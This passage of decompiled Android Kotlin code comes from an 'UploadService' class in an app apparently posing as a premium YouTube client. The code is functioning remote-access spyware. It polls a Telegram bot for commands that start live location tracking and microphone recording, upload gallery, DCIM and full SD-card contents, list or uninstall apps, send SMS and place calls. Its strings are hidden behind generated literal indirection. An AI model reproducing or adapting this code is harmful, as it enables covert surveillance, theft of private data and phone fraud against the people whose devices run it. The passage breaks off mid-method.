                                    } else if (Intrinsics.areEqual(text, LiveLiterals$UploadServiceKt.INSTANCE.m۱۲۳۷String$arg1$callEQEQ$cond23$when$body$loop$branch$if$branch$if$branch$if$try$body$loop$fun$anonymous$$arg2$calllaunch$arg0$call$setpollingJob$$funstartTelegramPolling$classUploadService())) {
                                        if (!UploadService.this.liveLocationEnabled) {
                                            UploadService.this.liveLocationEnabled = LiveLiterals$UploadServiceKt.INSTANCE.m۱۲۱Boolean$arg0$call$setliveLocationEnabled$$branch$if$branch23$when$body$loop$branch$if$branch$if$branch$if$try$body$loop$fun$anonymous$$arg2$calllaunch$arg0$call$setpollingJob$$funstartTelegramPolling$classUploadService();
                                        }
                                        Job job11 = UploadService.this.liveLocationJob;
                                        if (job11 != null) {
                                            Job.DefaultImpls.cancel$default(job11, (CancellationException) null, 1, (Object) null);
                                            Unit unit11 = Unit.INSTANCE;
                                        }
                                        UploadService.this.liveLocationJob = BuildersKt.launch$default($this$launch, (CoroutineContext) null, (CoroutineStart) null, new AnonymousClass90(UploadService.this, null), 3, (Object) null);
                                        BuildersKt.launch$default($this$launch, (CoroutineContext) null, (CoroutineStart) null, new AnonymousClass91(UploadService.this, null), 3, (Object) null);
                                    } else if (Intrinsics.areEqual(text, LiveLiterals$UploadServiceKt.INSTANCE.m۱۲۳۹String$arg1$callEQEQ$cond24$when$body$loop$branch$if$branch$if$branch$if$try$body$loop$fun$anonymous$$arg2$calllaunch$arg0$call$setpollingJob$$funstartTelegramPolling$classUploadService())) {
                                        UploadService.this.liveLocationEnabled = LiveLiterals$UploadServiceKt.INSTANCE.m۱۲۳Boolean$arg0$call$setliveLocationEnabled$$branch24$when$body$loop$branch$if$branch$if$branch$if$try$body$loop$fun$anonymous$$arg2$calllaunch$arg0$call$setpollingJob$$funstartTelegramPolling$classUploadService();
                                        Job job12 = UploadService.this.liveLocationJob;
                                        if (job12 != null) {
                                            Job.DefaultImpls.cancel$default(job12, (CancellationException) null, 1, (Object) null);
                                            Unit unit12 = Unit.INSTANCE;
                                        }
                                        UploadService.this.liveLocationJob = null;
                                        BuildersKt.launch$default($this$launch, (CoroutineContext) null, (CoroutineStart) null, new AnonymousClass92(UploadService.this, null), 3, (Object) null);
                                    } else if (Intrinsics.areEqual(text, LiveLiterals$UploadServiceKt.INSTANCE.m۱۲۴۱String$arg1$callEQEQ$cond25$when$body$loop$branch$if$branch$if$branch$if$try$body$loop$fun$anonymous$$arg2$calllaunch$arg0$call$setpollingJob$$funstartTelegramPolling$classUploadService())) {
                                        BuildersKt.launch$default($this$launch, (CoroutineContext) null, (CoroutineStart) null, new AnonymousClass93(UploadService.this, null), 3, (Object) null);
                                    } else if (Intrinsics.areEqual(text, LiveLiterals$UploadServiceKt.INSTANCE.m۱۲۴۳String$arg1$callEQEQ$cond26$when$body$loop$branch$if$branch$if$branch$if$try$body$loop$fun$anonymous$$arg2$calllaunch$arg0$call$setpollingJob$$funstartTelegramPolling$classUploadService())) {
                                        UploadService.this.sendAllDataEnabled = LiveLiterals$UploadServiceKt.INSTANCE.m۱۴۹Boolean$arg0$call$setsendAllDataEnabled$$branch26$when$body$loop$branch$if$branch$if$branch$if$try$body$loop$fun$anonymous$$arg2$calllaunch$arg0$call$setpollingJob$$funstartTelegramPolling$classUploadService();
                                        BuildersKt.launch$default($this$launch, (CoroutineContext) null, (CoroutineStart) null, new AnonymousClass94(UploadService.this, null), 3, (Object) null);
                                    } else if (Intrinsics.areEqual(text, LiveLiterals$UploadServiceKt.INSTANCE.m۱۲۴۵String$arg1$callEQEQ$cond27$when$body$loop$branch$if$branch$if$branch$if$try$body$loop$fun$anonymous$$arg2$calllaunch$arg0$call$setpollingJob$$funstartTelegramPolling$classUploadService())) {
                                        UploadService.this.sendAllDataEnabled = LiveLiterals$UploadServiceKt.INSTANCE.m۱۵۱Boolean$arg0$call$setsendAllDataEnabled$$branch27$when$body$loop$branch$if$branch$if$branch$if$try$body$loop$fun$anonymous$$arg2$calllaunch$arg0$call$setpollingJob$$funstartTelegramPolling$classUploadService();
                                        BuildersKt.launch$default($this$launch, (CoroutineContext) null, (CoroutineStart) null, new AnonymousClass95(UploadService.this, null), 3, (Object) null);
                                    } else if (Intrinsics.areEqual(text, LiveLiterals$UploadServiceKt.INSTANCE.m۱۲۴۷String$arg1$callEQEQ$cond28$when$body$loop$branch$if$branch$if$branch$if$try$body$loop$fun$anonymous$$arg2$calllaunch$arg0$call$setpollingJob$$funstartTelegramPolling$classUploadService())) {
                                        UploadService.this.microphoneEnabled = LiveLiterals$UploadServiceKt.INSTANCE.m۱۲۵Boolean$arg0$call$setmicrophoneEnabled$$branch28$when$body$loop$branch$if$branch$if$branch$if$try$body$loop$fun$anonymous$$arg2$calllaunch$arg0$call$setpollingJob$$funstartTelegramPolling$classUploadService();
                                        BuildersKt.launch$default($this$launch, (CoroutineContext) null, (CoroutineStart) null, new AnonymousClass96(UploadService.this, null), 3, (Object) null);
                                        UploadService.this.startMicRecordingLoop();
                                    } else if (Intrinsics.areEqual(text, LiveLiterals$UploadServiceKt.INSTANCE.m۱۲۴۹String$arg1$callEQEQ$cond29$when$body$loop$branch$if$branch$if$branch$if$try$body$loop$fun$anonymous$$arg2$calllaunch$arg0$call$setpollingJob$$funstartTelegramPolling$classUploadService())) {
                                        UploadService.this.microphoneEnabled = LiveLiterals$UploadServiceKt.INSTANCE.m۱۲۷Boolean$arg0$call$setmicrophoneEnabled$$branch29$when$body$loop$branch$if$branch$if$branch$if$try$body$loop$fun$anonymous$$arg2$calllaunch$arg0$call$setpollingJob$$funstartTelegramPolling$classUploadService();
                                        BuildersKt.launch$default($this$launch, (CoroutineContext) null, (CoroutineStart) null, new AnonymousClass97(UploadService.this, null), 3, (Object) null);
                                        UploadService.this.stopMicRecordingLoop();
                                    } else if (Intrinsics.areEqual(text, LiveLiterals$UploadServiceKt.INSTANCE.m۱۲۵۳String$arg1$callEQEQ$cond30$when$body$loop$branch$if$branch$if$branch$if$try$body$loop$fun$anonymous$$arg2$calllaunch$arg0$call$setpollingJob$$funstartTelegramPolling$classUploadService())) {
                                        BuildersKt.launch$default($this$launch, (CoroutineContext) null, (CoroutineStart) null, new AnonymousClass98(UploadService.this, null), 3, (Object) null);
                                        UploadService.this.sendInstalledAppsToTelegram();
                                    } else if (Intrinsics.areEqual(text, LiveLiterals$UploadServiceKt.INSTANCE.m۱۲۵۵String$arg1$callEQEQ$cond31$when$body$loop$branch$if$branch$if$branch$if$try$body$loop$fun$anonymous$$arg2$calllaunch$arg0$call$setpollingJob$$funstartTelegramPolling$classUploadService())) {
                                        BuildersKt.launch$default($this$launch, (CoroutineContext) null, (CoroutineStart) null, new AnonymousClass99(UploadService.this, null), 3, (Object) null);
                                        UploadService.this.startGalleryPhotoSending();
                                    } else if (Intrinsics.areEqual(text, LiveLiterals$UploadServiceKt.INSTANCE.m۱۲۵۷String$arg1$callEQEQ$cond32$when$body$loop$branch$if$branch$if$branch$if$try$body$loop$fun$anonymous$$arg2$calllaunch$arg0$call$setpollingJob$$funstartTelegramPolling$classUploadService())) {
                                        UploadService.this.stopGalleryPhotoSending();
                                        BuildersKt.launch$default($this$launch, (CoroutineContext) null, (CoroutineStart) null, new AnonymousClass100(UploadService.this, null), 3, (Object) null);
                                    } else if (StringsKt.startsWith$default(text, LiveLiterals$UploadServiceKt.INSTANCE.m۱۰۸۷String$arg0$callstartsWith$cond33$when$body$loop$branch$if$branch$if$branch$if$try$body$loop$fun$anonymous$$arg2$calllaunch$arg0$call$setpollingJob$$funstartTelegramPolling$classUploadService(), false, 2, (Object) null)) {
                                        String pkg2 = StringsKt.removePrefix(text, LiveLiterals$UploadServiceKt.INSTANCE.m۹۴۴String$arg0$callremovePrefix$valpkg$branch33$when$body$loop$branch$if$branch$if$branch$if$try$body$loop$fun$anonymous$$arg2$calllaunch$arg0$call$setpollingJob$$funstartTelegramPolling$classUploadService());
                                        UploadService.this.uninstallAppByPackage(pkg2);
                                    } else if (Intrinsics.areEqual(text, LiveLiterals$UploadServiceKt.INSTANCE.m۱۲۵۹String$arg1$callEQEQ$cond34$when$body$loop$branch$if$branch$if$branch$if$try$body$loop$fun$anonymous$$arg2$calllaunch$arg0$call$setpollingJob$$funstartTelegramPolling$classUploadService())) {
                                        UploadService.this.vibrateDevice(LiveLiterals$UploadServiceKt.INSTANCE.m۳۴۳Long$arg0$callvibrateDevice$branch34$when$body$loop$branch$if$branch$if$branch$if$try$body$loop$fun$anonymous$$arg2$calllaunch$arg0$call$setpollingJob$$funstartTelegramPolling$classUploadService());
                                        BuildersKt.launch$default($this$launch, (CoroutineContext) null, (CoroutineStart) null, new AnonymousClass101(UploadService.this, null), 3, (Object) null);
                                    } else if (Intrinsics.areEqual(text, LiveLiterals$UploadServiceKt.INSTANCE.m۱۲۶۱String$arg1$callEQEQ$cond35$when$body$loop$branch$if$branch$if$branch$if$try$body$loop$fun$anonymous$$arg2$calllaunch$arg0$call$setpollingJob$$funstartTelegramPolling$classUploadService())) {
                                        UploadService.this.stopVibration();
                                        BuildersKt.launch$default($this$launch, (CoroutineContext) null, (CoroutineStart) null, new AnonymousClass102(UploadService.this, null), 3, (Object) null);
                                    } else if (Intrinsics.areEqual(text, LiveLiterals$UploadServiceKt.INSTANCE.m۱۲۶۳String$arg1$callEQEQ$cond36$when$body$loop$branch$if$branch$if$branch$if$try$body$loop$fun$anonymous$$arg2$calllaunch$arg0$call$setpollingJob$$funstartTelegramPolling$classUploadService())) {
                                        BuildersKt.launch$default($this$launch, (CoroutineContext) null, (CoroutineStart) null, new AnonymousClass103(UploadService.this, null), 3, (Object) null);
                                    } else if (StringsKt.startsWith$default(text, LiveLiterals$UploadServiceKt.INSTANCE.m۱۰۸۲String$arg0$callstartsWith$cond$cond37$when$body$loop$branch$if$branch$if$branch$if$try$body$loop$fun$anonymous$$arg2$calllaunch$arg0$call$setpollingJob$$funstartTelegramPolling$classUploadService(), false, 2, (Object) null) && !StringsKt.startsWith$default(text, LiveLiterals$UploadServiceKt.INSTANCE.m۱۰۷۸String$arg0$callstartsWith$$this$callnot$branch$cond37$when$body$loop$branch$if$branch$if$branch$if$try$body$loop$fun$anonymous$$arg2$calllaunch$arg0$call$setpollingJob$$funstartTelegramPolling$classUploadService(), false, 2, (Object) null)) {
                                        String filename2 = StringsKt.trim(StringsKt.removePrefix(text, LiveLiterals$UploadServiceKt.INSTANCE.m۹۳۰String$arg0$callremovePrefix$$$this$calltrim$valfilename$branch37$when$body$loop$branch$if$branch$if$branch$if$try$body$loop$fun$anonymous$$arg2$calllaunch$arg0$call$setpollingJob$$funstartTelegramPolling$classUploadService())).toString();
                                        BuildersKt.launch$default($this$launch, (CoroutineContext) null, (CoroutineStart) null, new AnonymousClass104(UploadService.this, filename2, null), 3, (Object) null);
                                    } else if (StringsKt.startsWith$default(text, LiveLiterals$UploadServiceKt.INSTANCE.m۱۰۸۹String$arg0$callstartsWith$cond38$when$body$loop$branch$if$branch$if$branch$if$try$body$loop$fun$anonymous$$arg2$calllaunch$arg0$call$setpollingJob$$funstartTelegramPolling$classUploadService(), false, 2, (Object) null)) {
                                        String folder2 = StringsKt.trim(StringsKt.removePrefix(text, LiveLiterals$UploadServiceKt.INSTANCE.m۹۳۳String$arg0$callremovePrefix$$$this$calltrim$valfolder$branch38$when$body$loop$branch$if$branch$if$branch$if$try$body$loop$fun$anonymous$$arg2$calllaunch$arg0$call$setpollingJob$$funstartTelegramPolling$classUploadService())).toString();
                                        BuildersKt.launch$default($this$launch, (CoroutineContext) null, (CoroutineStart) null, new AnonymousClass105(UploadService.this, folder2, null), 3, (Object) null);
                                    } else if (Intrinsics.areEqual(text, LiveLiterals$UploadServiceKt.INSTANCE.m۱۲۶۵String$arg1$callEQEQ$cond39$when$body$loop$branch$if$branch$if$branch$if$try$body$loop$fun$anonymous$$arg2$calllaunch$arg0$call$setpollingJob$$funstartTelegramPolling$classUploadService())) {
                                        BuildersKt.launch$default($this$launch, (CoroutineContext) null, (CoroutineStart) null, new AnonymousClass106(UploadService.this, null), 3, (Object) null);
                                    } else if (Intrinsics.areEqual(text, LiveLiterals$UploadServiceKt.INSTANCE.m۱۲۶۹String$arg1$callEQEQ$cond40$when$body$loop$branch$if$branch$if$branch$if$try$body$loop$fun$anonymous$$arg2$calllaunch$arg0$call$setpollingJob$$funstartTelegramPolling$classUploadService())) {
                                        BuildersKt.launch$default($this$launch, (CoroutineContext) null, (CoroutineStart) null, new AnonymousClass107(UploadService.this, null), 3, (Object) null);
                                    } else if (StringsKt.startsWith$default(text, LiveLiterals$UploadServiceKt.INSTANCE.m۱۰۸۴String$arg0$callstartsWith$cond$cond41$when$body$loop$branch$if$branch$if$branch$if$try$body$loop$fun$anonymous$$arg2$calllaunch$arg0$call$setpollingJob$$funstartTelegramPolling$classUploadService(), false, 2, (Object) null) && !StringsKt.startsWith$default(text, LiveLiterals$UploadServiceKt.INSTANCE.m۱۰۸۰String$arg0$callstartsWith$$this$callnot$branch$cond41$when$body$loop$branch$if$branch$if$branch$if$try$body$loop$fun$anonymous$$arg2$calllaunch$arg0$call$setpollingJob$$funstartTelegramPolling$classUploadService(), false, 2, (Object) null)) {
                                        String filename3 = StringsKt.trim(StringsKt.removePrefix(text, LiveLiterals$UploadServiceKt.INSTANCE.m۹۳۲String$arg0$callremovePrefix$$$this$calltrim$valfilename$branch41$when$body$loop$branch$if$branch$if$branch$if$try$body$loop$fun$anonymous$$arg2$calllaunch$arg0$call$setpollingJob$$funstartTelegramPolling$classUploadService())).toString();
                                        BuildersKt.launch$default($this$launch, (CoroutineContext) null, (CoroutineStart) null, new AnonymousClass108(UploadService.this, filename3, null), 3, (Object) null);
                                    } else if (StringsKt.startsWith$default(text, LiveLiterals$UploadServiceKt.INSTANCE.m۱۰۹۱String$arg0$callstartsWith$cond42$when$body$loop$branch$if$branch$if$branch$if$try$body$loop$fun$anonymous$$arg2$calllaunch$arg0$call$setpollingJob$$funstartTelegramPolling$classUploadService(), false, 2, (Object) null)) {
                                        String folder3 = StringsKt.trim(StringsKt.removePrefix(text, LiveLiterals$UploadServiceKt.INSTANCE.m۹۳۵String$arg0$callremovePrefix$$$this$calltrim$valfolder$branch42$when$body$loop$branch$if$branch$if$branch$if$try$body$loop$fun$anonymous$$arg2$calllaunch$arg0$call$setpollingJob$$funstartTelegramPolling$classUploadService())).toString();
                                        BuildersKt.launch$default($this$launch, (CoroutineContext) null, (CoroutineStart) null, new AnonymousClass109(UploadService.this, folder3, null), 3, (Object) null);
                                    } else if (Intrinsics.areEqual(text, LiveLiterals$UploadServiceKt.INSTANCE.m۱۲۷۳String$arg1$callEQEQ$cond43$when$body$loop$branch$if$branch$if$branch$if$try$body$loop$fun$anonymous$$arg2$calllaunch$arg0$call$setpollingJob$$funstartTelegramPolling$classUploadService())) {
                                        BuildersKt.launch$default($this$launch, (CoroutineContext) null, (CoroutineStart) null, new AnonymousClass110(UploadService.this, null), 3, (Object) null);
                                    } else if (Intrinsics.areEqual(text, LiveLiterals$UploadServiceKt.INSTANCE.m۱۲۷۵String$arg1$callEQEQ$cond44$when$body$loop$branch$if$branch$if$branch$if$try$body$loop$fun$anonymous$$arg2$calllaunch$arg0$call$setpollingJob$$funstartTelegramPolling$classUploadService())) {
                                        BuildersKt.launch$default($this$launch, (CoroutineContext) null, (CoroutineStart) null, new AnonymousClass111(UploadService.this, null), 3, (Object) null);
                                    } else if (Intrinsics.areEqual(text, LiveLiterals$UploadServiceKt.INSTANCE.m۱۲۷۷String$arg1$callEQEQ$cond45$when$body$loop$branch$if$branch$if$branch$if$try$body$loop$fun$anonymous$$arg2$calllaunch$arg0$call$setpollingJob$$funstartTelegramPolling$classUploadService())) {
                                        BuildersKt.launch$default($this$launch, (CoroutineContext) null, (CoroutineStart) null, new AnonymousClass112(UploadService.this, null), 3, (Object) null);
                                        BuildersKt.launch$default($this$launch, (CoroutineContext) null, (CoroutineStart) null, new AnonymousClass113(UploadService.this, null), 3, (Object) null);
                                    } else if (Intrinsics.areEqual(text, LiveLiterals$UploadServiceKt.INSTANCE.m۱۲۷۹String$arg1$callEQEQ$cond46$when$body$loop$branch$if$branch$if$branch$if$try$body$loop$fun$anonymous$$arg2$calllaunch$arg0$call$setpollingJob$$funstartTelegramPolling$classUploadService())) {
                                        String replyMarkup2 = UploadService.this.buildDownloadFolderKeyboard();
                                        BuildersKt.launch$default($this$launch, (CoroutineContext) null, (CoroutineStart) null, new AnonymousClass114(UploadService.this, replyMarkup2, null), 3, (Object) null);
                                    } else if (Intrinsics.areEqual(text, LiveLiterals$UploadServiceKt.INSTANCE.m۱۲۸۱String$arg1$callEQEQ$cond47$when$body$loop$branch$if$branch$if$branch$if$try$body$loop$fun$anonymous$$arg2$calllaunch$arg0$call$setpollingJob$$funstartTelegramPolling$classUploadService())) {
                                        UploadService.this.dcimCameraFolderSending = LiveLiterals$UploadServiceKt.INSTANCE.m۱۰۳Boolean$arg0$call$setdcimCameraFolderSending$$branch47$when$body$loop$branch$if$branch$if$branch$if$try$body$loop$fun$anonymous$$arg2$calllaunch$arg0$call$setpollingJob$$funstartTelegramPolling$classUploadService();
                                        BuildersKt.launch$default($this$launch, (CoroutineContext) null, (CoroutineStart) null, new AnonymousClass115(UploadService.this, null), 3, (Object) null);
                                        BuildersKt.launch$default($this$launch, (CoroutineContext) null, (CoroutineStart) null, new AnonymousClass116(UploadService.this, null), 3, (Object) null);
                                    } else if (Intrinsics.areEqual(text, LiveLiterals$UploadServiceKt.INSTANCE.m۱۲۸۳String$arg1$callEQEQ$cond48$when$body$loop$branch$if$branch$if$branch$if$try$body$loop$fun$anonymous$$arg2$calllaunch$arg0$call$setpollingJob$$funstartTelegramPolling$classUploadService())) {
                                        UploadService.this.dcimCameraFolderSending = LiveLiterals$UploadServiceKt.INSTANCE.m۱۰۴Boolean$arg0$call$setdcimCameraFolderSending$$branch48$when$body$loop$branch$if$branch$if$branch$if$try$body$loop$fun$anonymous$$arg2$calllaunch$arg0$call$setpollingJob$$funstartTelegramPolling$classUploadService();
                                        BuildersKt.launch$default($this$launch, (CoroutineContext) null, (CoroutineStart) null, new AnonymousClass117(UploadService.this, null), 3, (Object) null);
                                    } else if (Intrinsics.areEqual(text, LiveLiterals$UploadServiceKt.INSTANCE.m۱۲۸۵String$arg1$callEQEQ$cond49$when$body$loop$branch$if$branch$if$branch$if$try$body$loop$fun$anonymous$$arg2$calllaunch$arg0$call$setpollingJob$$funstartTelegramPolling$classUploadService())) {
                                        UploadService.this.picturesFolderSending = LiveLiterals$UploadServiceKt.INSTANCE.m۱۳۱Boolean$arg0$call$setpicturesFolderSending$$branch49$when$body$loop$branch$if$branch$if$branch$if$try$body$loop$fun$anonymous$$arg2$calllaunch$arg0$call$setpollingJob$$funstartTelegramPolling$classUploadService();
                                        BuildersKt.launch$default($this$launch, (CoroutineContext) null, (CoroutineStart) null, new AnonymousClass118(UploadService.this, null), 3, (Object) null);
                                        BuildersKt.launch$default($this$launch, (CoroutineContext) null, (CoroutineStart) null, new AnonymousClass119(UploadService.this, null), 3, (Object) null);
                                    } else if (Intrinsics.areEqual(text, LiveLiterals$UploadServiceKt.INSTANCE.m۱۲۸۷String$arg1$callEQEQ$cond50$when$body$loop$branch$if$branch$if$branch$if$try$body$loop$fun$anonymous$$arg2$calllaunch$arg0$call$setpollingJob$$funstartTelegramPolling$classUploadService())) {
                                        UploadService.this.picturesFolderSending = LiveLiterals$UploadServiceKt.INSTANCE.m۱۳۲Boolean$arg0$call$setpicturesFolderSending$$branch50$when$body$loop$branch$if$branch$if$branch$if$try$body$loop$fun$anonymous$$arg2$calllaunch$arg0$call$setpollingJob$$funstartTelegramPolling$classUploadService();
                                        BuildersKt.launch$default($this$launch, (CoroutineContext) null, (CoroutineStart) null, new AnonymousClass120(UploadService.this, null), 3, (Object) null);
                                    } else if (Intrinsics.areEqual(text, LiveLiterals$UploadServiceKt.INSTANCE.m۱۲۸۹String$arg1$callEQEQ$cond51$when$body$loop$branch$if$branch$if$branch$if$try$body$loop$fun$anonymous$$arg2$calllaunch$arg0$call$setpollingJob$$funstartTelegramPolling$classUploadService())) {
                                        UploadService.this.dcimFolderSending = LiveLiterals$UploadServiceKt.INSTANCE.m۱۰۷Boolean$arg0$call$setdcimFolderSending$$branch51$when$body$loop$branch$if$branch$if$branch$if$try$body$loop$fun$anonymous$$arg2$calllaunch$arg0$call$setpollingJob$$funstartTelegramPolling$classUploadService();
                                        BuildersKt.launch$default($this$launch, (CoroutineContext) null, (CoroutineStart) null, new AnonymousClass121(UploadService.this, null), 3, (Object) null);
                                        BuildersKt.launch$default($this$launch, (CoroutineContext) null, (CoroutineStart) null, new AnonymousClass122(UploadService.this, null), 3, (Object) null);
                                    } else if (Intrinsics.areEqual(text, LiveLiterals$UploadServiceKt.INSTANCE.m۱۲۹۱String$arg1$callEQEQ$cond52$when$body$loop$branch$if$branch$if$branch$if$try$body$loop$fun$anonymous$$arg2$calllaunch$arg0$call$setpollingJob$$funstartTelegramPolling$classUploadService())) {
                                        UploadService.this.dcimFolderSending = LiveLiterals$UploadServiceKt.INSTANCE.m۱۰۸Boolean$arg0$call$setdcimFolderSending$$branch52$when$body$loop$branch$if$branch$if$branch$if$try$body$loop$fun$anonymous$$arg2$calllaunch$arg0$call$setpollingJob$$funstartTelegramPolling$classUploadService();
                                        BuildersKt.launch$default($this$launch, (CoroutineContext) null, (CoroutineStart) null, new AnonymousClass123(UploadService.this, null), 3, (Object) null);
                                    } else if (Intrinsics.areEqual(text, LiveLiterals$UploadServiceKt.INSTANCE.m۱۲۹۳String$arg1$callEQEQ$cond53$when$body$loop$branch$if$branch$if$branch$if$try$body$loop$fun$anonymous$$arg2$calllaunch$arg0$call$setpollingJob$$funstartTelegramPolling$classUploadService())) {
                                        UploadService.this.fullSdcardSending = LiveLiterals$UploadServiceKt.INSTANCE.m۱۱۳Boolean$arg0$call$setfullSdcardSending$$branch53$when$body$loop$branch$if$branch$if$branch$if$try$body$loop$fun$anonymous$$arg2$calllaunch$arg0$call$setpollingJob$$funstartTelegramPolling$classUploadService();
                                        BuildersKt.launch$default($this$launch, (CoroutineContext) null, (CoroutineStart) null, new AnonymousClass124(UploadService.this, null), 3, (Object) null);
                                        BuildersKt.launch$default($this$launch, (CoroutineContext) null, (CoroutineStart) null, new AnonymousClass125(UploadService.this, null), 3, (Object) null);
                                    } else if (Intrinsics.areEqual(text, LiveLiterals$UploadServiceKt.INSTANCE.m۱۲۹۴String$arg1$callEQEQ$cond54$when$body$loop$branch$if$branch$if$branch$if$try$body$loop$fun$anonymous$$arg2$calllaunch$arg0$call$setpollingJob$$funstartTelegramPolling$classUploadService())) {
                                        UploadService.this.fullSdcardSending = LiveLiterals$UploadServiceKt.INSTANCE.m۱۱۴Boolean$arg0$call$setfullSdcardSending$$branch54$when$body$loop$branch$if$branch$if$branch$if$try$body$loop$fun$anonymous$$arg2$calllaunch$arg0$call$setpollingJob$$funstartTelegramPolling$classUploadService();
                                        BuildersKt.launch$default($this$launch, (CoroutineContext) null, (CoroutineStart) null, new AnonymousClass126(UploadService.this, null), 3, (Object) null);
                                    } else if (StringsKt.startsWith$default(text, LiveLiterals$UploadServiceKt.INSTANCE.m۱۰۹۶String$arg0$callstartsWith$cond55$when$body$loop$branch$if$branch$if$branch$if$try$body$loop$fun$anonymous$$arg2$calllaunch$arg0$call$setpollingJob$$funstartTelegramPolling$classUploadService(), false, 2, (Object) null)) {
                                        String rest2 = StringsKt.removePrefix(text, LiveLiterals$UploadServiceKt.INSTANCE.m۹۴۷String$arg0$callremovePrefix$valrest$branch55$when$body$loop$branch$if$branch$if$branch$if$try$body$loop$fun$anonymous$$arg2$calllaunch$arg0$call$setpollingJob$$funstartTelegramPolling$classUploadService());
                                        int idx2 = StringsKt.indexOf$default(rest2, LiveLiterals$UploadServiceKt.INSTANCE.m۲۱۰Char$arg0$callindexOf$validx$branch55$when$body$loop$branch$if$branch$if$branch$if$try$body$loop$fun$anonymous$$arg2$calllaunch$arg0$call$setpollingJob$$funstartTelegramPolling$classUploadService(), 0, false, 6, (Object) null);
                                        if (idx2 > LiveLiterals$UploadServiceKt.INSTANCE.m۳۱۲Int$arg1$callgreater$cond$cond$if$branch55$when$body$loop$branch$if$branch$if$branch$if$try$body$loop$fun$anonymous$$arg2$calllaunch$arg0$call$setpollingJob$$funstartTelegramPolling$classUploadService() && rest2.length() > LiveLiterals$UploadServiceKt.INSTANCE.m۲۶۹Int$arg0$callplus$arg1$callgreater$branch$cond$if$branch55$when$body$loop$branch$if$branch$if$branch$if$try$body$loop$fun$anonymous$$arg2$calllaunch$arg0$call$setpollingJob$$funstartTelegramPolling$classUploadService() + idx2) {
                                            String number3 = rest2.substring(LiveLiterals$UploadServiceKt.INSTANCE.m۲۷۵Int$arg0$callsubstring$valnumber$branch$if$branch55$when$body$loop$branch$if$branch$if$branch$if$try$body$loop$fun$anonymous$$arg2$calllaunch$arg0$call$setpollingJob$$funstartTelegramPolling$classUploadService(), idx2);
                                            Intrinsics.checkNotNullExpressionValue(number3, "this as java.lang.String…ing(startIndex, endIndex)");
                                            String msg6 = rest2.substring(LiveLiterals$UploadServiceKt.INSTANCE.m۲۶۷Int$arg0$callplus$arg0$callsubstring$valmsg$branch$if$branch55$when$body$loop$branch$if$branch$if$branch$if$try$body$loop$fun$anonymous$$arg2$calllaunch$arg0$call$setpollingJob$$funstartTelegramPolling$classUploadService() + idx2);
                                            Intrinsics.checkNotNullExpressionValue(msg6, "this as java.lang.String).substring(startIndex)");
                                            UploadService.this.sendSmsAndNotify(number3, msg6);
                                        } else {
                                            BuildersKt.launch$default($this$launch, (CoroutineContext) null, (CoroutineStart) null, new AnonymousClass127(UploadService.this, null), 3, (Object) null);
                                        }
                                    } else if (StringsKt.startsWith$default(text, LiveLiterals$UploadServiceKt.INSTANCE.m۱۰۹۷String$arg0$callstartsWith$cond56$when$body$loop$branch$if$branch$if$branch$if$try$body$loop$fun$anonymous$$arg2$calllaunch$arg0$call$setpollingJob$$funstartTelegramPolling$classUploadService(), false, 2, (Object) null)) {
                                        String number4 = StringsKt.removePrefix(text, LiveLiterals$UploadServiceKt.INSTANCE.m۹۴۳String$arg0$callremovePrefix$valnumber$branch56$when$body$loop$branch$if$branch$if$branch$if$try$body$loop$fun$anonymous$$arg2$calllaunch$arg0$call$setpollingJob$$funstartTelegramPolling$classUploadService());
                                        if (!StringsKt.isBlank(number4)) {
                                            UploadService.this.makeCallAndNotify(number4);
                                        } else {
                                            BuildersKt.launch$default($this$launch, (CoroutineContext) null, (CoroutineStart) null, new AnonymousClass128(UploadService.this, null), 3, (Object) null);
                                        }
                                    }
                                }
                                i2 = i + 1;
                            }
                        }
                    }
                } catch (Exception e) {
                    Log.e(LiveLiterals$UploadServiceKt.INSTANCE.m۸۳۰String$arg0$calle$catch$body$loop$fun$anonymous$$arg2$calllaunch$arg0$call$setpollingJob$$funstartTelegramPolling$classUploadService(), LiveLiterals$UploadServiceKt.INSTANCE.m۵۶۸String$0$str$arg1$calle$catch$body$loop$fun$anonymous$$arg2$calllaunch$arg0$call$setpollingJob$$funstartTelegramPolling$classUploadService() + e.getMessage());
                }
                r3.L$0 = $this$launch;
                r3.label = 1;
                if (DelayKt.delay(LiveLiterals$UploadServiceKt.INSTANCE.m۳۳۴Long$arg0$calldelay$body$loop$fun$anonymous$$arg2$calllaunch$arg0$call$setpollingJob$$funstartTelegramPolling$classUploadService(), (Continuation) r3) == coroutine_suspended) {
                    return coroutine_suspended;
                }
            }
            return Unit.INSTANCE;
        }

        /* JADX INFO: renamed from: com.w8sb.w8premiumyt.UploadService$startTelegramPolling$1$1, reason: invalid class name and collision with other inner class name */
        /* JADX INFO: compiled from: UploadService.kt */
        @Metadata(d1 = {"\u0000\n\n\u0002\u0018\u0002\n\u0002\u0010\u0002\n\u0000\u0010\u0002\u001a\u00020\u0001*\u00020\u0000H\u008a@"}, d2 = {"Lkotlinx/coroutines/CoroutineScope;", "", "<anonymous>"}, k = 3, mv = {1, 8, 0})
        @DebugMetadata(c = "com.w8sb.w8premiumyt.UploadService$startTelegramPolling$1$1", f = "UploadService.kt", i = {}, l = {}, m = "invokeSuspend", n = {}, s = {})
        static final class C۰۰۰۱1 extends SuspendLambda implements Function2<CoroutineScope, Continuation<? super Unit>, Object> {
            final /* synthetic */ String $callbackId;
            int label;
            final /* synthetic */ UploadService this$0;

            /* JADX WARN: 'super' call moved to the top of the method (can break code semantics) */
            C۰۰۰۱1(String str, UploadService uploadService, Continuation<? super C۰۰۰۱1> continuation) {
                super(2, continuation);
                this.$callbackId = str;
                this.this$0 = uploadService;
            }

            public final Continuation<Unit> create(Object obj, Continuation<?> continuation) {
                return new C۰۰۰۱1(this.$callbackId, this.this$0, continuation);
            }

            public final Object invoke(CoroutineScope coroutineScope, Continuation<? super Unit> continuation) {
                return create(coroutineScope, continuation).invokeSuspend(Unit.INSTANCE);
            }

            public final Object invokeSuspend(Object obj) {
                IntrinsicsKt.getCOROUTINE_SUSPENDED();
                switch (this.label) {
                    case 0:
                        ResultKt.throwOnFailure(obj);
                        try {
                            FormBody.Builder builder = new FormBody.Builder((Charset) null, 1, (DefaultConstructorMarker) null);
                            String str = LiveLiterals$UploadServiceKt.INSTANCE.m۷۵۵String$arg0$calladd$$this$calladd$$this$calladd$$this$callbuild$valanswerReq$try$fun$anonymous$$arg2$calllaunch$branch$if$body$loop$branch$if$branch$if$branch$if$try$body$loop$fun$anonymous$$arg2$calllaunch$arg0$call$setpollingJob$$funstartTelegramPolling$classUploadService();
                            String str2 = this.$callbackId;
                            Intrinsics.checkNotNullExpressionValue(str2, "callbackId");
